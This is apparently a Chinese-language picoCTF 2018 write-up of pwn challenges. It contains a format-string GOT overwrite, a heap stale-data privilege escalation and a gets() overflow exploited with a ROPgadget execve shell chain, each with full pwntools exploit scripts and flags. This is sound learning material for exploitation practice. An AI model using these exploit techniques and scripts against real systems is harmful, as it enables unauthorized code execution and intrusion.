payload1 = fmtstr_payload(7,{puts_got:vuln_addr})
n.recvuntil('message:')
n.sendline(payload1)

leak_payload = p32(system_got)+'%7$s'
n.send(leak_payload)
n.recvuntil('message:')
system_addr = u32(n.recv()[5:9])
print hex(system_addr)

payload = fmtstr_payload(7,{printf_got:system_addr})
n.sendline(payload)

n.interactive()
```





### are you root?

```bash
➜  are_you_root file auth 
auth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=42ebad5f08a8e9d227f3783cc951f2737547e086, not stripped
➜  are_you_root checksec auth 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/are_you_root/auth'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

源码分析过一遍后,我们锁定了几个存在漏洞可能的分支

输入用的是fgets

```c
if(fgets(buf, 512, stdin) == NULL)
      break;
```

```c
typedef enum auth_level {
  ANONYMOUS = 1,
  GUEST = 2,
  USER = 3,
  ADMIN = 4,
  ROOT = 5
} auth_level_t;
  
struct user {
  char *name;
  auth_level_t level;
};
```

login分支

```c
    else if (!strncmp(buf, "login", 5))
    {
      if (user != NULL)
      {
	       puts("Already logged in. Reset first.");
	       continue;
      }

      arg = strtok(&buf[6], "\n");
      if (arg == NULL)
      {
        puts("Invalid command");
	      continue;
      }

      user = (struct user *)malloc(sizeof(struct user));
      if (user == NULL) 
      {
        puts("malloc() returned NULL. Out of Memory\n");
        exit(-1);
      }
      user->name = strdup(arg);
      printf("Logged in as \"%s\"\n", arg);

    }
```

reset分支

```c
    else if(!strncmp(buf, "reset", 5))
    {
      if (user == NULL)
      {
      	puts("Not logged in!");
      	continue;
      }

      free(user->name);
      user = NULL;

      puts("Logged out!");
    }
```

我们先登陆一个name='a'* 0x10,level=3的账号，下断点看一下堆里面的分布

```c
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk                
0x603000            0x0                 0x410                Used                None              None
0x603410            0x0                 0x20                 Used                None              None
0x603430            0x0                 0x20                 Used                None              None
gdb-peda$ x/8x 0x603410
0x603410:	0x0000000000000000			 0x0000000000000021
0x603420:	0x0000000000603440 <-*name	 0x0000000000000003 <-level
0x603430:	0x0000000000000000			0x0000000000000021
0x603440:	0x6161616161616161 <-name	0x6161616161616161 <-name
gdb-peda$ 
0x603450:	0x0000000000000000			0x0000000000020bb1
0x603460:	0x0000000000000000			0x0000000000000000
0x603470:	0x0000000000000000			0x0000000000000000
0x603480:	0x0000000000000000			0x0000000000000000
```

然后reset这个账号，再看下堆

```c
gdb-peda$ x/8x 0x603410
0x603410:	0x0000000000000000		     0x0000000000000021
0x603420:	0x0000000000603440 <-*name	 0x0000000000000003
0x603430:	0x0000000000000000			0x0000000000000021
0x603440:	0x0000000000000000			0x6161616161616161 <- over_name
gdb-peda$ 
0x603450:	0x0000000000000000			0x0000000000020bb1
0x603460:	0x0000000000000000			0x0000000000000000
0x603470:	0x0000000000000000			0x0000000000000000
0x603480:	0x0000000000000000			0x0000000000000000

```

发现0x603440里的值已经置为NULL了，但0x603448部分的值却没被清0，又因为我们的name可以输入很长，并且在建立账号时并没有对level置0操作，所以如果我们去构造一个name使其可以覆盖到下一个堆的level位就可以做到下一个账号的level位可以任意修改

我们再建一个账号看看下一个账号的level位和前一个账号的name的相对位置

```c
gdb-peda$ x/8x 0x603410
0x603410:	0x0000000000000000			0x0000000000000021
0x603420:	0x0000000000603440			0x0000000000000000
0x603430:	0x0000000000000000 <-name	0x0000000000000021
0x603440:	0x0000000000603460			0x0000000000000003 <-level
```

通过计算我们可以很容易得到name的起始位置和下一个账号的level位距离位8，那么我们直接构造'a'* 0x8+p64(5)就能设好下一个账号的level位

EXP

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = remote('2018shell2.picoctf.com',41208)
#n = process('./auth')
elf = ELF('./auth')

def reset():
    n.recvuntil('> ')
    n.sendline('reset')

def login(name):
    n.recvuntil('> ')
    n.sendline('login '+name)

def getflag():
    n.sendline('get-flag')

payload = 'a'*8+p64(5)
login(payload)
gdb.attach(n)

reset()
login('Ep3ius')
getflag()

n.interactive()
```

FLAG

```
picoCTF{m3sS1nG_w1tH_tH3_h43p_bc7d345a}
```



### can-you-gets-me

```bash
➜  can-you-gets-me file gets 
gets: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=4141b1e04d2e7f1623a4b8923f0f87779c0827ee, not stripped
➜  can-you-gets-me checksec gets 
[*] '/home/Ep3ius/pwn/process/picoCTF2018/can-you-gets-me/gets'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("GIVE ME YOUR NAME!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

看了一波源码，只给了一个gets和printf，一开始我还想说是不是用ret2dl-resolve，后来肝了一天都没肝出，查报错的时候发现没办法找到plt表，就在想这个会不会是静态编译的文件，就用ldd检查了下

```bash
➜  can-you-gets-me ldd gets
	不是动态可执行文件
➜  can-you-gets-me 
```

emmmm，居然还真是静态库编译的那么我们试试用ropgadget的ropchain来构造ROP链玄学一键getshell

```bash
ROPgadget --binary gets --ropchain
```

```bash
- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806f02a) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080b81c6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f02a) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080b81c6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f02a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049303) # xor eax, eax ; ret
	p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080de955) # pop ecx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x0806f02a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049303) # xor eax, eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0807a86f) # inc eax ; ret
	p += pack('<I', 0x0806cc25) # int 0x80
➜  can-you-gets-me
```

结果确实只要溢出后执行就能getshell了

EXP

```python
from pwn import*
from struct import pack
n = process('./gets')
# Padding goes here
p = 'a'*0x18 + 'aaaa'	    # buf 
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b81c6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b81c6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret
p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de955) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806f02a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08049303) # xor eax, eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0807a86f) # inc eax ; ret
p += pack('<I', 0x0806cc25) # int 0x80

n.recvuntil('NAME!')
n.sendline(p)
n.interactive()
```

FLAG

```
picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}
```

